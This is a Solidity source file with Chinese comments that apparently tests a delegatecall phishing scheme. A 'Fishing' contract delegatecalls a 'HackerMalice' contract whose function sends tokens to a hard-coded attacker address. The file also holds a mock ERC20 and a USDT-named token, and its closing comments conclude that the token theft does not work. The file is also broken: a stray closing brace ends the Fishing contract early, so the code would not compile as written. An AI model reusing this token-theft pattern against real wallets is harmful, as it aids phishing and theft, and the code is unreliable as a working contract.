// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";


// 合约调用测试，不会用到
contract ContractA {
      function callContract(address _addr) public {
       Fishing(_addr).delegateCallMethod();//他调用之后msg.sender是谁
    }

}

// 钓鱼合约使用delegatecall，部署参数指定黑客合约地址来调用黑客合约
contract Fishing {
    //关于上下文改变用到delegatecall执行当前上下文，一定要注意保持变量顺序一致性
    address public msgSender;
    address public hackerContractAddress;//黑客合约地址
    
    constructor(address _hackContract) {
       hackerContractAddress = _hackContract;
    }

    // delegateCall调用，注意调用的函数会写在当前合约
    function delegateCallMethod() public {
        bytes memory callMethodData = abi.encodeWithSignature(
            "hackerFunc()"
        );

        (bool success,bytes memory data ) = hackerContractAddress.delegatecall(callMethodData);
        require(success, "delegateCall Error");
        //     if (!success) {
        // // 如果调用失败，尝试解码错误信息
        // if (data.length > 0) {
        //     // 获取回滚原因，例如 "ERC20: insufficient allowance"
        //     // 这里使用了EVM的 ABI-encoded error format (solidity-revert-reason)
        //     assembly {
        //         let ptr := add(data, 0x20)
        //         revert(ptr, mload(data))
        //     }
        // } else {
        //     // 如果没有提供回滚原因，抛出通用错误
        //     revert("Delegatecall failed with no reason.");
        // }
    }
    }
    // delegateCall调用，注意调用的函数会写在当前合约
    function delegateCallMsgsenderMethod() public {
        bytes memory callMethodData = abi.encodeWithSignature(
            "hackerFuncMsgsender()"
        );

        (bool success, ) = hackerContractAddress.delegatecall(callMethodData);
        require(success, "delegateCall Error");
    }
}


// 黑客拿到权限的合约，指定黑客自己收款账户
contract HackerMalice {

    address public msgSender;//当前环境不会修改
  
       using SafeERC20 for IERC20;

    // function getmsgSender() public view returns(address) {
    //   return msgSender;
    // }
    // function setmsgSender() public   {
    //    msgSender = 0x6666000000000000000000000000000000006666;
    // }

    // 黑客恶意代码，这个函数不使用任何一个变量不会有delegatecall插槽导致不齐的问题
    function hackerFunc() public {
        
        // usdt合约地址，黑客eoa账户。这个执行是被钓鱼的eoa执行的
        bool success= IERC20(0xE682b91c33B76918BDD0143267E28B64BE1093E9
         ).transfer(
            0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2,1);//转移代币
        // usdt合约地址，黑客eoa账户。这个执行是被钓鱼的eoa执行的
       require(success,"transfer Errorrrrrrr");
        
    }

    function hackerFuncMsgsender() public {

        msgSender=msg.sender;
    
    }

}




// ERC20模拟器
contract Erc20MockContract {


    address public msgSender;//当前环境不会修改
    address public to;//当前环境不会修改
    uint256 public amount;//当前环境不会修改

    function transfer(address _to,uint _amount) public returns(bool){


         msgSender = msg.sender;
         to = _to;
         amount = _amount;

         return true;

    }

}




// 一个简单的usdt合约
contract UnitedStatesDollarTether is ERC20, Ownable, ERC20Permit {
    constructor(address recipient, address initialOwner)
        ERC20("United States Dollar Tether", "USDT")
        Ownable(initialOwner)
        ERC20Permit("United States Dollar Tether")
    {
        _mint(recipient, 10000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}


//总结出无法通过delegatecall实现erc20的transfer攻击，eoa身份无法保持调用transfer，进入transfer环境会改变msg.sender
// 那么delegatecall直接call用transfer呢，答案是不行的，相当于transfer执行在当前上下文，盗取不了代币
